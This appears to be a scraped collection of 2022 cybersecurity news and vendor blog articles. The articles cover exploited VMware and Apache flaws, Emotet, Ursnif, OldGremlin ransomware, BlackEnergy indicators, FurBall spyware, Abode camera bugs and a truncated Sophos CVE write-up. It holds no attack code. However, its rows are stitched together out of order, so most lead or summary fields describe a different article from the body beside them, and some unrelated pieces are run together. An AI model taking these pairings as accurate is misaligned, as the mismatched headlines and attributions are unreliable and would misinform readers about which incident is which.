""The attacker intends to utilize a victim's resources as much as possible, not only to install RAR1Ransom for extortion, but also to spread GuardMiner to collect cryptocurrency,"" Fortinet FortiGuard Labs researcher Cara Lin said in a Thursday report. The issue, tracked as CVE-2022-22954 (CVSS score: 9.8), concerns a remote code execution vulnerability that stems from a case of server-side template injection. Although the shortcoming was addressed by the virtualization services provider in April 2022, it has since come under active exploitation in the wild. Fortinet said it observed in August 2022 attacks that sought to weaponize the flaw to deploy the Mirai botnet on Linux devices as well as the RAR1Ransom and GuardMiner , a variant of the XMRig Monero miner. The Mirai sample is retrieved from a remote server and is designed to launch denial-of-service (DoS) and brute-force attacks aimed at well-known IoT devices by making use of a list of default credentials. The distribution of RAR1Ransom and GuardMiner, on the other hand, is achieved by means of a PowerShell or a shell script depending on the operating system. RAR1ransom is also notable for leveraging the legitimate WinRAR utility to lock files in password-protected archives. Furthermore, GuardMiner comes with capabilities to propagate to other hosts by taking advantage of exploits for a number of remote code execution flaws in other software, including those in Apache Struts , Atlassian Confluence , and Spring Cloud Gateway . The findings are yet another reminder that malware campaigns continue to actively exploit recently disclosed flaws to break into unpatched systems, making it essential that users prioritize applying necessary security updates to mitigate such threats.",['Malware'],d3e7785c-b293-5aed-bb2b-056059318c45,"A now-patched vulnerability in VMware Workspace ONE Access has been observed being exploited to deliver both cryptocurrency miners and ransomware.

The vulnerability, tracked as CVE-2022-42889 aka Text4Shell , has been assigned a severity ranking of 9.8 out of a possible 10.0 on the CVSS scale and affects versions 1.5 through 1.9 of the library. It's also similar to the now infamous Log4Shell vulnerability in that the issue is rooted in the manner string substitutions carried out during DNS, script, and URL lookups could lead to the execution of arbitrary code on susceptible systems when passing untrusted input. ""The attacker can send a crafted payload remotely using 'script,' 'dns,' and 'url' lookups to achieve arbitrary remote code execution,"" Zscaler ThreatLabZ team explained . A successful exploitation of the flaw can enable a threat actor to open a reverse shell connection with the vulnerable application simply via a specially crafted payload, effectively opening the door for follow-on attacks. While the issue was originally reported in early March 2022, the Apache Software Foundation (ASF) released an updated version of the software (1.10.0) on September 24, followed by issuing an advisory only last week on October 13. ""Fortunately, not all users of this library would be affected by this vulnerability – unlike Log4j in the Log4Shell vulnerability, which, which was vulnerable even in its most basic use-cases,"" Checkmarx researcher Yaniv Nizry said . ""Apache Commons Text must be used in a certain way to expose the attack surface and make the vulnerability exploitable."" Wordfence also reiterated that the likelihood of successful exploitation is significantly limited in scope when compared to Log4j, with most of the payloads observed so far designed to scan for vulnerable installations. ""A successful attempt would result in the victim site making a DNS query to the attacker-controlled listener domain,"" Wordfence researcher Ram Gall said , adding requests with script and URL prefixes have been comparatively lower in volume. If anything, the development is yet another indication of the potential security risks posed by third-party open source dependencies, necessitating that organizations routinely assess their attack surface and set up appropriate patch management strategies. Users who have direct dependencies on Apache Commons Text are recommended to upgrade to the fixed version to mitigate potential threats. According to Maven Repository , as many as 2,593 projects use the library, although Flashpoint noted that very few of those listed use the vulnerable method. The Apache Commons Text flaw also follows another critical security weakness that was disclosed in Apache Commons Configuration in July 2022 ( CVE-2022-33980 , CVSS score: 9.8), which could result in arbitrary code execution through the variable interpolation functionality.",['Malware'],4e3b28fd-3904-5e7b-8d98-a2602ac5cbd5,"WordPress security firm Wordfence started detecting exploitation attempts targeting the newly disclosed flaw in Apache Commons Text on October 18, 2022.

In an attack chain detected by Trustwave SpiderLabs researchers, an invoice-themed ZIP file lure was found to contain a nested self-extracting (SFX) archive, the first archive acting as a conduit to launch the second. While phishing attacks like these traditionally require persuading the target into opening the attachment, the cybersecurity company said the campaign sidesteps this hurdle by making use of a batch file to automatically supply the password to unlock the payload. The first SFX archive file further makes use of either a PDF or Excel icon to make it appear legitimate, when, in reality, it contains three components: the password-protected second SFX RAR file, the aforementioned batch script which launches the archive, and a decoy PDF or image. ""The execution of the batch file leads to the installation of the malware lurking within the password-protected RARsfx [self-extracting RAR archive],"" researchers Bernard Bautista and Diana Lopera said in a Thursday write-up. The batch script achieves this by specifying the archive's password and the destination folder to which the payload will be extracted, in addition to launching a command to display the lure document in an attempt to conceal the malicious activity. Lastly, the infection culminates in the execution of CoinMiner, a cryptocurrency miner that can also double up as a credential stealer, or Quasar RAT , an open source .NET-based remote access trojan , depending on the payload packed in the archive. The one-click attack technique is also notable in that it effectively jumps past the password barrier, enabling malicious actors to carry out a wide range of actions such as cryptojacking, data exfiltration, and ransomware. Trustwave said it has identified an increase in threats packaged in password-protected ZIP files, with about 96% of these being distributed by the Emotet botnet. ""The self-extracting archive has been around for a long time and eases file distribution among end users,"" the researchers said. ""However, it poses a security risk since the file contents are not easily verifiable, and it can run commands and executables silently.""",['Malware'],6cc1adf4-2e28-50e8-9c94-51201d282227,"The notorious Emotet botnet is using password-protected archive files to drop CoinMiner and Quasar RAT on compromised systems.

Bank fraud has cost British consumers nearly 610 million pounds (A$1.1 billion) so far this year, posing a national security threat, banking lobby group UK Finance said this month. Banks have already improved defences against scams, but a report from industry body Stop Scams UK and the Royal United Services Institute on Thursday said complex guidelines and processes around privacy law make it difficult for companies to share data to stop fraud. Britain has proposed an 'online safety bill' to deal with harmful content online, and help financial regulators crack down harder on scams. Banks hope the bill will include clearer guidance on allowing them to share anonymised customer data to spot new types of scams more quickly. ""If we are to unlock data sharing at scale, we call for proportionate and sensible changes to guidance around the interpretation of privacy law,"" said Ruth Evans, chair of Stop Scams UK, whose members include HSBC, Lloyds, NatWest, Barclays, TalkTalk, Meta and Google. Risk of regulatory intervention and a lack of clarity on what is allowed under the law stifles initiative, and changes in policy are needed to make it clear that sharing data is allowed and even encouraged, the report said. Last month, more banks jointed Stop Scams UK's fraud-reporting hotline as the cost of living crisis is leading to an increase in the number of financial scams. However, banks demanding more certainty over sharing anonymised data face opposition from privacy groups.","['bank', 'data breach', 'finance', 'privacy', 'scams']",4988175b-6c64-53e5-9d1b-8f1adaa8b361,"Banks, tech and telecom companies in Britain are calling on regulators and lawmakers to make it easier for them to share anonymised data on customers.

Designed to launch distributed denial-of-service (DDoS) attacks or download customized spam or banking data-stealer plug-ins, it was again used to target the State Bar of Georgia last May. Following the most recent cyber attack, the office had to suspend normal operations until the issue was addressed. Investigations that ensued soon after the incident revealed the use of BlackEnergy along with the identification of eight domains—clusteron[.]ru, svdrom[.]cn, funpic[.]org, logartos[.]org, pizdos[.]net, weberror[.]cn, h278666y[.]net, and inattack[.]ru—as indicators of compromise (IoCs). Using these web properties as jump-off points for a deep dive enabled by WHOIS and Domain Name System (DNS) data led to the discovery of: A sample of the additional artifacts obtained from our analysis is available for download from our website . To help organizations to protect their networks from BlackEnergy-enabled attacks, we identified as many possibly related artifacts with WHOIS and DNS data. Using the IoC domains identified as DNS lookup search terms led to the discovery of 49 IP addresses to which they resolved. These were spread across 11 countries led by the U.S., Netherlands, Russia, Germany, and Singapore. While none of the IP addresses are currently considered dangerous as per malware checks we conducted, monitoring them for signs of malicious activity may still be worth doing as some of them served as shared hosts to the IoCs. A closer scrutiny of the historical WHOIS records of the domains tagged as IoCs, meanwhile, allowed us to uncover two unredacted email addresses—135224*****@163[.]com and asdf9*****@21cn[.]com—used to register them. Reverse IP and reverse WHOIS lookups using the IP addresses and email addresses, respectively, as search terms further provided 6,003 possibly connected domains. A bulk WHOIS lookup for these showed that a majority of them were registered under SnapNames, LLC, which accounted for 10% of the total domain volume, among other registrars shown in the figure below. The following chart compares the countries where most of the IP addresses (left: country geolocation) and domain registrations (right: registrant country) were concentrated. The U.S., Netherlands, and Russia consistently figured in the top 5 countries in terms of both IP geolocation and domain registration. That isn’t surprising given that SnapNames, GoDaddy, NamePal, DropCatch, TurnCommerce, and Namecheap are based in the U.S., while REGRU-RU, RU-CENTER-RU, Regional Network Information Center, and REGTIME-RU are based in Russia. As the final step, we subjected the 6,000+ possibly connected domains to a bulk malware check via the Threat Intelligence Platform (TIP) and found that 141 of them were detected by various malware engines as malware or spam hosts. Organizations that want to avoid the unwanted consequences that BlackEnergy poses, specifically an operational disruption, may want to block access to the domains identified as IoCs and the additional 141 possibly connected domains we found. Monitoring the connected IP addresses for signs of malicious activity may also help.

6354b3205edf360a3703b895,microsoft,https://www.microsoft.com/en-us/security/blog/2022/10/21/securing-iot-devices-against-attacks-that-target-critical-infrastructure/,Securing IoT devices against attacks that target critical infrastructure,Microsoft Security Threat Intelligence,2022-10-21,"South Staffordshire PLC, a company that supplies water to over one million customers in the United Kingdom, notified its customers in August of being a target of a criminal cyberattack. This incident highlights the sophisticated threats that critical industries face today. According to South Staffordshire, the breach did not appear to have caused damage to the systems and it did not impact their ability to supply safe water to their customers. The attack brings to light the risk of threat actors gaining access to industrial control system (ICS) environments. According to reports , a group associated with the Cl0p ransomware claimed responsibility for the attack, which followed a familiar extortion model wherein attackers extort the target for exfiltrated data without encrypting the organization’s files. After the attack, confidential documents, along with screenshots of the supervisory control and data acquisition (SCADA) system used by water treatment plants were leaked. As details of the attack and the vector used to access South Staffordshire PLC’s networks are limited, the Microsoft Defender for IoT research team did further research on techniques used by threat actors in similar attacks. Microsoft researchers have previously observed activity relating to internet-exposed IoT devices across different industries, which may be used as a potential foothold into OT networks. Threat actors gain access by deploying malware on information technology (IT) devices and then crossing the boundary to the operational technology (OT) part of the network to target high-value operational assets, or by compromising unmanaged, usually less secure IoT and OT devices. IoT devices in critical infrastructure networks IoT devices offer significant value to organizations and extend beyond environmental monitoring sensors to common office equipment and network devices. However, IoT devices in critical infrastructure networks, if not properly secured, increase the risk of unauthorized access to operational assets and networks. Improper configurations such as default credentials and unpatched vulnerabilities are often abused by threat actors to gain network or device access. Once access is established, attackers could identify other assets on the same network, perform reconnaissance, and plan large-scale attacks on sensitive equipment and devices. In monitoring threats against critical infrastructure and utilities, Microsoft researchers investigated water utility providers in the United Kingdom with exposed IoT devices within their networks. Using open-source intelligence (OSINT) and Microsoft Defender Threat Intelligence data, the team searched for exposed IoT devices integrated into the networks of water utility providers and found that such facilities were using Draytek Vigor routers, which are intended for home use. Figure 1. Global mapping of internet-exposed Draytek Vigor devices With difficult-to-patch devices such as printers, cameras, routers, and gateway devices overlooked as potential footholds into networks, they are often left exposed. In analyzing Microsoft threat intelligence, Microsoft researchers observed threat actors abusing a known remote code execution vulnerability in Draytek Vigor devices ( CVE-2020-8515 ) to deploy the Mirai botnet. Once attackers establish device access, remote code execution vulnerabilities such as CVE-2020-8515 can then allow attackers to run malicious commands on devices, move laterally within the network, and access other vulnerable devices which were not directly exposed to the internet such as SCADA systems. In water treatment applications, SCADA systems allow water plants to monitor levels of specific chemicals and toxins and to collect records of the systems. While the attack against South Staffordshire PLC does not appear to have included the abuse of these devices, the release of files pertaining to OT systems constitutes a high-risk to operations and highlights the importance of network segmentation to protect devices and networks from lateral movement. Defending critical networks Attacks on utility providers’ OT networks and devices are high-risk events that can range from data theft to the manipulation of devices controlling the operations. Such events can lead to the interruption of operations, or in severe cases, potential harm to individuals and customers (For example, when hackers gained access to the water system of one Florida city as reported in February 2021). Given the severity of these attacks and their potential impact on the utility providers’ operations and even the safety of their customers, it becomes crucial to recognize the importance of proper security practices around IoT & OT unmanaged devices to ensure that such attacks do not happen. Defenses set up for OT networks must be comprehensive, able to prevent unauthorized system access and should include detections for abnormal, unfamiliar, and malicious behaviors after a breach. It is important to protect assets and have strict security protocols in place for how and when devices and data can be accessed. We recommend the following defense strategies for organizations with both IoT and OT devices within their networks: Adopt a comprehensive IoT and OT security solution such as Microsoft Defender for IoT to allow visibility and monitoring of all IoT and OT devices, threat detection and response, and integration with SIEM/SOAR and XDR platforms such as Microsoft Sentinel and Microsoft Defender 365. Enable vulnerability assessments to identify unpatched devices in the organizational network and set workflows for initiating appropriate patch processes through Microsoft Defender Vulnerability Management and Microsoft Defender for Endpoint with the Microsoft Defender for IoT add-on . Reduce the attack surface by eliminating unnecessary internet connections to IoT devices and OT control systems. Implement Zero Trust practices by applying network segmentation to prevent an attacker from moving laterally and compromising assets after intrusion. IoT devices and OT networks should be isolated from IT and OT networks with firewalls. Extend vulnerability and exposure control beyond the firewall with Microsoft Defender External Attack Surface Management . Turn on attack surface reduction rules in Microsoft Defender for Endpoint to prevent common attack techniques such as those used by ransomware groups. Increase network security by enforcing multi factor authentication (MFA) methods such as Azure Active Directory MFA. Enable network protection to prevent applications or users from accessing malicious domains and other malicious content on the internet.

As with previous roundups, this post isn't meant to be an in-depth analysis. Instead, this post will summarize the threats we've observed by highlighting key behavioral characteristics, indicators of compromise, and discussing how our customers are automatically protected from these threats. As a reminder, the information provided for the following threats in this post is non-exhaustive and current as of the date of publication. Additionally, please keep in mind that IOC searching is only one part of threat hunting. Spotting a single IOC does not necessarily indicate maliciousness. Detection and coverage for the following threats is subject to updates, pending additional threat or vulnerability analysis. For the most current information, please refer to your Firepower Management Center, Snort.org , or ClamAV.net . For each threat described below, this blog post only lists 25 of the associated file hashes and up to 25 IOCs for each category. An accompanying JSON file can be found here that includes the complete list of file hashes, as well as all other IOCs from this post. A visual depiction of the MITRE ATT&CK techniques associated with each threat is also shown. In these images, the brightness of the technique indicates how prevalent it is across all threat files where dynamic analysis was conducted. There are five distinct shades that are used, with the darkest indicating that no files exhibited technique behavior and the brightest indicating that technique behavior was observed from 75 percent or more of the files. The most prevalent threats highlighted in this roundup are: Threat Name Type Description Win.Dropper.Shiz-9974680-0 Dropper Shiz is a remote access trojan that allows an attacker to access an infected machine to harvest sensitive information. It is commonly spread via droppers or if a user visits a malicious site. Win.Dropper.DarkComet-9974770-1 Dropper DarkComet and related variants are a family of remote access trojans designed to provide an attacker with control over an infected system. Capabilities of this malware include the ability to download files from a user's machine, mechanisms for persistence and hiding, and the ability to send back usernames and passwords from the infected system. Win.Virus.Xpiro-9975154-1 Virus Expiro is a known file infector and information-stealer that hinders analysis with anti-debugging and anti-analysis tricks. Win.Packed.Fareit-9974907-0 Packed The Fareit trojan is primarily an information stealer with functionality to download and install other malware. Win.Dropper.Kovter-9975143-1 Dropper Kovter is known for its fileless persistence mechanism. This family of malware creates several malicious registry entries which store its malicious code. Kovter can reinfect a system, even if the file system has been cleaned of the infection. Kovter has been used in the past to spread ransomware and click-fraud malware. Win.Dropper.Razy-9975201-0 Dropper Razy is often a generic detection name for a Windows trojan. It collects sensitive information from the infected host and encrypts the data, eventually sending it to a command and control (C2) server. Information collected may include screenshots. The samples modify auto-execute functionality by setting and creating a value in the registry for persistence. Win.Dropper.Zegost-9975205-0 Dropper Zegost is a remote access trojan designed to provide an attacker with complete control over an infected system. Capabilities include monitoring keystrokes, collecting video footage from the webcam and uploading/executing follow-on malware. It appears to be derived from Gh0stRAT, which is a well-known remote access trojan that had its source code leaked, significantly lowering the barrier to entry for actors looking to modify and reuse the code in new attacks.

Smart appliances bring comfort and convenience to our day-to-day lives, but they can also create new complications and risks for home security. As more consumers use devices connected to the Internet of Things (IoT), the opportunity for cyberattacks increases. Survey About IoT Cybersecurity Ratings BlackBerry recently conducted a survey of 1,088 U.S. consumers, revealing concerns over the security of Internet-connected devices. More than half (56%) of respondents say they’re worried about the security of their smart home devices — such as thermostats, doorbells, and refrigerators — being hacked. Two in three (68%) respondents say security concerns prevent them from connecting to Internet-enabled devices. Our survey results also reveal four in five respondents believe the rollout of a cybersecurity labeling system would make them feel safer and more informed when using Internet-connected devices, and two-thirds (64%) would be prepared to pay more for products with higher rankings. Connected Devices and Cybersecurity Concerns Devices such as electric vehicle (EV) charging stations, smart thermostats, and wireless security cameras all come with promises of greater savings, safety, or convenience. We’re making our homes “smarter,” but they’re not necessarily more cyber secure – and our survey results reveal buyers are worried about the devices they’re bringing into their lives: 53% say the potential for security-related incidents prevents them from using connected devices 56% say they wouldn’t feel comfortable having children interact with connected devices in their homes Some of the most popular connected devices used by respondents include smart speakers (39%), doorbells (23%), and robotic vacuums (17%). Respondents think smart speakers (21%) are the safest from a cybersecurity standpoint, followed by doorbells (13%), and thermostats (10%). Concerns extend from our homes to our roads. While EV charging stations require higher cybersecurity standards than connected household devices, 74% of respondents believe a labeling system should be extended to connected vehicles and EV charging stations. Will A Cybersecurity Labeling System Matter? Our survey results show most consumers believe a labeling system would make a difference: 82% say a labeling system would make them feel more informed when using connected devices 80% say a labeling system would make them feel safer when using connected devices 64% say they would be prepared to pay more for products with higher rankings When it comes to technology that’s supposed to keep our families safe – like the cameras that monitor our children while they sleep – consumers may be willing to pay more for cyber-secure devices. A cybersecurity labeling system could allow consumers to make buying decisions that prioritize security across the board, including the software supply chain .

""This is a significant shift from the malware's original purpose to enable banking fraud, but is consistent with the broader threat landscape,"" Mandiant researchers Sandor Nemes, Sulian Lebegue, and Jessa Valdez disclosed in a Wednesday analysis. The refreshed and refactored variant, first spotted by the Google-owned threat intelligence firm in the wild on June 23, 2022, has been codenamed LDR4, in what's being seen as an attempt to lay the groundwork for potential ransomware and data theft extortion operations. Ursnif, also called Gozi or ISFB, is one of the oldest banker malware families, with the earliest documented attacks going as far back as 2007. Check Point, in August 2020, mapped the "" divergent evolution of Gozi "" over the years, while pointing out its fragmented development history. Almost a year later in late June 2021, a Romanian threat actor, Mihai Ionut Paunescu, was arrested by Colombian law enforcement officials for his role in propagating the malware to no fewer than a million computers from 2007 to 2012. The latest attack chain detailed by Mandiant demonstrates the use of recruitment and invoice-related email lures as an initial intrusion vector to download a Microsoft Excel document, which then fetches and launches the malware. The major refurbishment of Ursnif eschews all its banking-related features and modules in favor of retrieving a VNC module and gaining a remote shell into the compromised machine, which are carried out by connecting to a remote server to obtain said commands. ""These shifts may reflect the threat actors' increased focus towards participating in or enabling ransomware operations in the future,"" the researchers said.",['Malware'],103e1d77-5c89-55b3-b720-9d0f8351c32e,"The Ursnif malware has become the latest malware to revamp itself into a generic backdoor capable of delivering next-stage payloads. “This is a significant shift from the malware's original purpose to enable banking fraud, but is consistent with the broader threat landscape,"" Mandiant researchers Sandor Nemes, Sulian Lebegue, and Jessa Valdez disclosed in a Wednesday analysis."

Blog by Jon Munshaw. Cisco Talos recently discovered several vulnerabilities in the Abode Systems iota All-In-One Security Kit. This kit includes a main security camera and hub that can alert users of unwanted movement in their homes. It also includes several motion sensors that can be attached to windows and doors. The devices communicate with the user via a website or app on their mobile device and can connect to smart hubs like Google Home, Amazon Alexa and Apple Homekit. The vulnerabilities Talos discovered could lead to a variety of conditions, including providing attackers with the ability to change users’ login passwords, inject code onto the device, manipulate sensitive device configurations, and cause the system to shut down. The devices contain several format string injection vulnerabilities in various functions of its software that could lead to memory corruption, information disclosure and a denial of service. An attacker could send a malicious XML payload to trigger these vulnerabilities. TALOS-2022-1585 (CVE-2022-35884 - CVE-2022-35887) TALOS-2022-1584 (CVE-2022-33938) TALOS-2022-1581 (CVE-2022-35874 - CVE-2022-35877) TALOS-2022-1568 (CVE-2022-33204 – CVE-2022-33207) TALOS-2022-1561 (CVE-2022-29520) TALOS-2022-1558 (CVE-2022-33189) There are four other vulnerabilities — TALOS-2022-1567 (CVE-2022-27804), TALOS-2022-1566 (CVE-2022-29472), TALOS-2022-1563 (CVE-2022-32586) and TALOS-2022-1562 (CVE-2022-30603) — that can also lead to code execution, though it requires the adversary to send a specially crafted HTTP request, rather than XML. TALOS-2022-1559 (CVE-2022-33192 - CVE-2022-33195), TALOS-2022-1558 (CVE-2022-33189), TALOS-2022-1557 (CVE-2022-30541) and TALOS-2022-1556 (CVE-2022-32773) are the most serious among the vulnerabilities we discovered, as they have a maximum 10 out of 10 CVSS severity score. An attacker could exploit these vulnerabilities by sending a series of malicious payloads to execute arbitrary system commands with root privileges. TALOS-2022-1582 (CVE-2022-35244) can be triggered with a specially crafted XCMD and can lead to memory corruption, information disclosure and denial of service. There is also a memory corruption vulnerability, TALOS-2022-1565 (CVE-2022-32574), that is triggered if an attacker sends a malicious, authenticated web request, resulting in a double-free heap corruption and a crash of the device’s software. TALOS-2022-1564 (CVE-2022-32775) is another memory corruption vulnerability triggered via an authenticated web request, but in this case leads to attacker-control of the program counter. An HTTP authentication bypass vulnerability — TALOS-2022-1554 (CVE-2022-29477) — could allow an attacker to access several sensitive functions on the device, including triggering a factory reset, simply by setting a particular HTTP header to a hard-coded value. TALOS-2022-1552 (CVE-2022-27805) is another authentication bypass vulnerability, this time in a UDP service responsible for handling remote configuration changes, which allows a remote attacker to trigger several sensitive device functions without the proper authentication. This would allow the attacker to manipulate the device in several ways, including disarming the device, reading and writing sensitive configuration values, rebooting the device, enabling the local web interface and changing the local web interface's administrative account username and password. Lastly, TALOS-2022-1553 (CVE-2022-29475), could allow an adversary who can execute a man-in-the-middle attack to replay various authorization fields to make sensitive configuration changes to the device without actual knowledge of the device’s password. Cisco Talos worked with Abode Systems to ensure that these issues are resolved and an update is available for affected customers, all in adherence to Cisco’s vulnerability disclosure policy .

""The group's victims include companies in sectors such as logistics, industry, insurance, retail, real estate, software development, and banking,"" Group-IB said in an exhaustive report shared with The Hacker News. ""In 2020, the group even targeted an arms manufacturer."" In what's a rarity in the ransomware landscape, OldGremlin (aka TinyScouts) is one of the very few financially motivated cybercrime gangs that primarily focuses on Russian companies. Other notable groups consist of Dharma, Crylock, and Thanos, contributing to an uptick in ransomware attacks targeting businesses in the country by over 200% in 2021. OldGremlin first came to light in September 2020 when the Singapore-headquartered cybersecurity company disclosed nine campaigns orchestrated by the actor between May and August. The first attack was detected in early April 2020. In all, the group is said to have conducted 10 phishing email campaigns in 2020, followed by one highly successful attack in 2021 and five more in 2022, with ransom demands touching a record $16.9 million. ""OldGremlin thoroughly studies their victims,"" Group-IB explained. ""The demanded ransom is therefore often proportional to the company's size and revenue and is obviously higher than the budget necessary for ensuring a suitable level of information security."" Known to mainly target enterprise networks running on Windows, attacks mounted by OldGremlin have leveraged phishing emails masquerading as tax and legal services companies to dupe victims into clicking on fraudulent links and downloading malicious files, allowing the attackers to worm their way inside the networks. ""The threat actors often pose as well-known companies, including the media group RBC, the legal assistance system Consultant Plus, the company 1C-Bitrix, the Russian Union of Industrialists and Entrepreneurs, and Minsk Tractor Works,"" Group-IB said. Upon gaining an initial foothold, OldGremlin moves to establish persistence by creating scheduled tasks, gaining elevated privileges using Cobalt Stroke, and even flaw in Cisco AnyConnect ( CVE-2020-3153 and CVE-2020-3433 ), while also gaining remote access to the compromised infrastructure using tools such as TeamViewer. Some of the aspects that make the crew stand out from other ransomware groups is that it doesn't rely on double extortion to coerce targeted companies into paying up despite exfiltrating the data. It has also been observed taking long breaks after each successful attack. What's more, the average dwell time until ransomware deployment has been pegged at 49 days, well above the reported 11 day median dwell time , suggesting extended efforts on part of the actor to examine the breached domain (which is achieved using a tool called TinyScout). OldGremlin's most recent phishing wave occurred on August 23, 2022, with emails embedding links pointing to a ZIP archive payload hosted on Dropbox to activate the killchain. These archive files, in turn, harbor a rogue LNK file (dubbed TinyLink) that downloads a backdoor called TinyFluff, which is one among the four implants used by the group: TinyPosh, TinyNode, and TinyShell, before deleting data backups and dropping the .NET-based TinyCrypt ransomware. Also put to use by OldGremlin are other tools such as TinyShot, a console utility for capturing screenshots, TinyKiller, which kills antivirus processes via a bring your own vulnerable driver (BYOVD) attack targeting gdrv.sys and RTCore64.sys drivers. It's worth noting that the operators behind the BlackByte ransomware group were also recently found leveraging the same flaw in the RTCore64.sys driver to turn off security solutions in the hacked machines. One other unusual application used by OldGremlin in its attacks is a .NET console app called TinyIsolator, which temporarily cuts off the host from the network by disabling network adaptors prior to executing the ransomware. On top of that, the group's malware arsenal encompasses a Linux version of TinyCrypt, which is written in GO and launched after deleting .bash_history files, changing user passwords to limit access to the compromised host, and disabling SSH. ""OldGremlin has debunked the myth that ransomware groups are indifferent to Russian companies,"" Ivan Pisarev, head of dynamic malware analysis team at Group-IB, said. ""Despite the fact that OldGremlin has been focusing on Russia so far, they should not be underestimated elsewhere. Many Russian-speaking gangs started off by targeting companies in post-Soviet space and then switched to other geographies.""",['Malware'],cddf9ec0-0f3f-512e-9f4e-4d8d158ac81d,"A Russian-speaking ransomware group dubbed OldGremlin has been attributed to 16 malicious campaigns aimed at entities operating in the transcontinental Eurasian nation over the course of two and a half years.

The Sydney Morning Herald yesterday reported it had heard from the alleged attackers , who were threatening to release patient data from a “200 gigabyte” haul. The threats included selling the data, or releasing information like diagnoses about the most prominent people found in the database. In an market disclosure late yesterday, the health insurer said it was “a new development” that will “cause concerns for customers”. “Medibank is working urgently to establish if the claim is true, although based on our ongoing forensic investigation we are treating the matter seriously at this time”, the announcement stated [ pdf ]. “Medibank systems have not been encrypted by ransomware, which means usual activities for customers continue."" When it first detected attackers’ traffic on its network, Medibank said it did not believe the attackers had obtained customer data. Earlier this week, it maintained that position, saying it detected activity regarded as a precursor to its attack. The trading halt, Medibank explained, is required so it can meet its continuous disclosure obligations, and will continue until further notice. “We continue to work with specialised cyber security firms and have advised the Australian Cyber Security Centre (ACSC),” the statement continued. “Our ongoing response to safeguard our networks and systems may cause necessary temporary disruptions to our services.” Medibank CEO David Koczkar said: “I apologise and understand this latest distressing update will concern our customers.” Update: Speaking to the ABC’s AM radio program this morning, cyber security minister Clare O’Neil said the Australian Signals Directorate has been “intimately involved” in assisting Medibank.

The Domestic Kitten campaign is known to conduct mobile surveillance operations against Iranian citizens and this new FurBall version is no different in its targeting. Since June 2021, it has been distributed as a translation app via a copycat of an Iranian website that provides translated articles, journals, and books. The malicious app was uploaded to VirusTotal where it triggered one of our YARA rules (used to classify and identify malware samples), which gave us the opportunity to analyze it. This version of FurBall has the same surveillance functionality as previous versions; however, the threat actors slightly obfuscated class and method names, strings, logs, and server URIs. This update required small changes on the C&C server as well – precisely, names of server-side PHP scripts. Since the functionality of this variant hasn’t changed, the main purpose of this update appears to be to avoid detection by security software. These modifications have had no effect on ESET software, however; ESET products detect this threat as Android/Spy.Agent.BWS. The analyzed sample requests only one intrusive permission – to access contacts. The reason could be its aim to stay under the radar; on the other hand, we also think it might signal it is just the preceding phase, of a spearphishing attack conducted via text messages. If the threat actor expands the app permissions, it would also be capable of exfiltrating other types of data from affected phones, such as SMS messages, device location, recorded phone calls, and much more. The APT-C-50 group, in its Domestic Kitten campaign, has been conducting mobile surveillance operations against Iranian citizens since 2016, as reported by Check Point in 2018. In 2019, Trend Micro identified a malicious campaign, possibly connected to Domestic Kitten, targeting the Middle East, naming the campaign Bouncing Golf. Shortly after, in the same year, Qianxin reported a Domestic Kitten campaign again targeting Iran. In 2020, 360 Core Security disclosed surveillance activities of Domestic Kitten targeting anti-government groups in the Middle East. The last known publicly available report is from 2021 by Check Point . FurBall – Android malware used in this operation since these campaigns began – is created based on the commercial stalkerware tool KidLogger. It seems that the FurBall developers were inspired by the open-source version from seven years ago that is available on Github, as pointed out by Check Point . This malicious Android application is delivered via a fake website mimicking a legitimate site that provides articles and books translated from English to Persian ( downloadmaghaleh.com ). Based on the contact information from the legitimate website, they provide this service from Iran, which leads us to believe with high confidence that the copycat website targets Iranian citizens. The purpose of the copycat is to offer an Android app for download after clicking on a button that says, in Persian, “Download the application”. The button has the Google Play logo, but this app is not available from the Google Play store; it is downloaded directly from the attacker’s server. The app was uploaded to VirusTotal where it triggered one of our YARA rules. In Figure 1 you can see a comparison of the fake and legitimate websites. Figure 1. Fake website (left) vs the legitimate one (right) Based on the last modified information that is available in the APK download’s open directory on the fake website (see Figure 2), we can infer that this app has been available for download at least since June 21 st , 2021. Figure 2. Open directory information for the malicious app This sample is not fully working malware, even though all spyware functionality is implemented as in its previous versions. Not all of its spyware functionality can be executed, however, because the app is limited by the permissions defined in its AndroidManifest.xml . If the threat actor expands the app permissions, it would also be capable of exfiltrating: It can also receive commands to take photos and record video, with the results being uploaded to the C&C server. The Furball variant downloaded from the copycat website can still receive commands from its C&C; however, it can only perform these functions: Figure 3 shows permission requests that do need to be accepted by the user. These permissions might not create an impression of being a spyware app, especially given that it poses as a translation app. Figure 3. List of requested permissions After installation, Furball makes an HTTP request to its C&C server every 10 seconds, asking for commands to execute, as can be seen in the upper panel of Figure 4. The lower panel depicts a “there’s nothing to do at the moment” response from the C&C server. Figure 4. Communication with C&C server These latest samples have no new features implemented, except for the fact that the code has simple obfuscation applied. Obfuscation can be spotted in class names, method names, some strings, logs, and server URI paths (which would also have required small changes on the backend). Figure 5 compares the class names of the older Furball version and the new version, with obfuscation. Figure 5.

The bug is due to improper validation of JSON keys submitted in the “JSON” parameter sent to the Controller endpoint. Successful exploitation of this vulnerability could result in remote code execution with the privileges of the root user. The following is a portion of their write-up covering CVE-2022-3236, with a few minimal modifications. Sophos recently patched a code injection vulnerability in Sophos Firewall v19.0 MR1 (19.0.1) and previous. This vulnerability is due to improper validation of JSON keys submitted in the “json” parameter sent to the Controller endpoint. A remote, unauthenticated attacker could exploit this vulnerability by sending a specially crafted request to an affected server. Successfully exploiting this vulnerability could result in remote code execution with the privileges of the root user. The Vulnerability Sophos Firewall is a network security solution, which can be deployed on purpose-built devices, on a cloud network (AWS/Azure), on a virtual device, or as a software appliance on x86 Intel hardware. The firewall application supports multiple network security features, including application-aware routing, TLS inspection, deep packet inspection, remote access VPN, logging, and reporting. Sophos Firewall exposes a web admin console for managing the device’s configuration via HTTPS on TCP port 4444. In addition, Sophos Firewall exposes a user portal for updating a user’s details or downloading authentication clients via HTTPS on TCP port 443. HTTP is a request/response protocol described in RFCs 7230 - 7237 and other RFCs. A request is sent by a client to a server, which in turn sends a response back to the client. An HTTP request consists of a request line, various headers, an empty line, and an optional message body: where CRLF represents the new line sequence Carriage Return (CR) followed by Line Feed (LF) and SP represents a space character. Parameters can be passed from the client to the server as name-value pairs in either the Request-URI or in the message-body, depending on the Method used and the Content-Type header. For example, a simple HTTP request passing a parameter named “param” with value “1”, using the GET method might look like this: A corresponding HTTP request using the POST method might look like this: JavaScript Object Notation (JSON) is a data-interchange format used for creating machine parseable, human-readable output. A JSON object has the following syntax: • An object is enclosed in curly braces {}. • An object is comprised of zero or more items delimited by 